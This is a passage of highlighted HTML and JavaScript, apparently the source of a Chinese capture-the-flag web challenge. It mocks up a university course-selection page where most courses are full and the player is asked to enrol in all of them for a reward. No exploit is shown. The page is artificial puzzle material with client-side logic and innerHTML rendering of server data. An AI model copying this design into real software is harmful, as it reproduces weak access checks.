class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Challenge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>选课<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;h1-container&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>自主选课<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;aside-container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aside</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>帮阿菇选到以下所有课程，阿菇会给你奖励！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ok-button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;TellAgu()&quot;</span>&gt;</span>选完了<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main-container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;detail-container&quot;</span> <span class="attr">class</span>=<span class="string">&quot;im-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;detail&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            2023-2024 学年 2 学期</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;red-text&quot;</span>&gt;</span>第2轮<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">b</span>&gt;</span>本学期选课要求<span class="tag">&lt;/<span class="name">b</span>&gt;</span>总学分最低 </span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;red-text&quot;</span>&gt;</span>16<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            最高</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;red-text&quot;</span>&gt;</span>36<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;selector-container&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;panel im-container&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">      panel-header</span></span></span><br><span class="line"><span class="string"><span class="tag">      to-select</span></span></span><br><span class="line"><span class="string"><span class="tag">    &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;panel-text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>(Axxxxxxx) 创业管理 - 2.0 学分 状态：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>未选<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-info-container display-flex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程性质<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>上课时间<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>教学地点<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>已选/容量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>创业管理<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>专业选修课<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>星期一第1,2节&#123;第1-16周&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>第7教研楼中8848<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>已满<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;selector-button wait-select-button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;selectCourse(1)&quot;</span>&gt;</span>选课<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;panel im-container&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">      panel-header</span></span></span><br><span class="line"><span class="string"><span class="tag">      to-select</span></span></span><br><span class="line"><span class="string"><span class="tag">    &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;panel-text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>(Axxxxxxx) 大学生职业发展与就业指导4 - 0.5 学分 状态：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>未选<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-info-container display-flex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程性质<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>上课时间<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>教学地点<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>已选/容量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>大学生职业发展与就业指导4<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>校定必修<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>星期三第6-7节&#123;1-7周(单)&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>第6教研楼北999<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>已满<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;selector-button wait-select-button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;selectCourse(2)&quot;</span>&gt;</span>选课<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;panel im-container&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;3&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">      panel-header</span></span></span><br><span class="line"><span class="string"><span class="tag">      to-select</span></span></span><br><span class="line"><span class="string"><span class="tag">    &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;panel-text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>(Txxxxxxx) 体育-羽毛球 - 1.0 学分 状态：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>未选<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-info-container display-flex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程性质<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>上课时间<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>教学地点<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>已选/容量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>体育-羽毛球<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>校定必修<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>星期二第1-2节&#123;1-16周&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>西边热身馆<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>已满<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;selector-button wait-select-button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;selectCourse(3)&quot;</span>&gt;</span>选课<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;panel im-container&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;4&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">      panel-header</span></span></span><br><span class="line"><span class="string"><span class="tag">      to-select</span></span></span><br><span class="line"><span class="string"><span class="tag">    &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;panel-text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>(Axxxxxxx)计算机网络原理 - 4.0 学分 状态：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>未选<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-info-container display-flex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程性质<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>上课时间<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>教学地点<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>已选/容量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>计算机网络原理<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>学科必修<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>星期五第6-9节&#123;8-15周&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>第4教研楼111-222-333-444<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>已满<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;selector-button wait-select-button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;selectCourse(4)&quot;</span>&gt;</span>选课<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;panel im-container&quot;</span> <span class="attr">data-id</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">      panel-header</span></span></span><br><span class="line"><span class="string"><span class="tag">      to-select</span></span></span><br><span class="line"><span class="string"><span class="tag">    &quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;panel-text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>(Axxxxxxx)操作系统及安全 - 3.0 学分 状态：<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>未选<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-info-container display-flex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>课程性质<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>上课时间<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>教学地点<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>已选/容量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>操作系统及安全<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>学科必修<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>星期二第3-5节&#123;1-16周&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>第7教研楼北000<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>未满<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;selector-button wait-select-button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;selectCourse(5)&quot;</span>&gt;</span>选课<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">togglePanelInfoContainer</span>(<span class="params">panel</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> panelInfoContainer = panel.<span class="title function_">querySelector</span>(<span class="string">&quot;.panel-info-container&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (panelInfoContainer.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&quot;display-flex&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">    panelInfoContainer.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;display-flex&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    panelInfoContainer.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;display-none&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    panelInfoContainer.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;display-none&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    panelInfoContainer.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;display-flex&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getCourses</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/courses&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">renderCourses</span>(data.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">renderCourses</span>(<span class="params">courses</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> selectorContainer = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;selector-container&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  courses.<span class="title function_">forEach</span>(<span class="function"><span class="params">course</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> section = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;section&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    section.<span class="property">className</span> = <span class="string">&#x27;panel im-container&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    section.<span class="title function_">setAttribute</span>(<span class="string">&#x27;data-id&#x27;</span>, course.<span class="property">id</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> panelHeader = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    panelHeader.<span class="property">className</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      panel-header</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      <span class="subst">$&#123;course.status ? <span class="string">&#x27;selected&#x27;</span> : <span class="string">&#x27;to-select&#x27;</span>&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span>;</span></span><br><span class="line"><span class="language-javascript">    panelHeader.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">togglePanelInfoContainer</span>(<span class="variable language_">this</span>.<span class="property">parentNode</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> panelText = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    panelText.<span class="property">className</span> = <span class="string">&#x27;panel-text&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    panelText.<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;span&gt;<span class="subst">$&#123;course.descrption&#125;</span> 状态：&lt;/span&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;span&gt;<span class="subst">$&#123;course.status ? <span 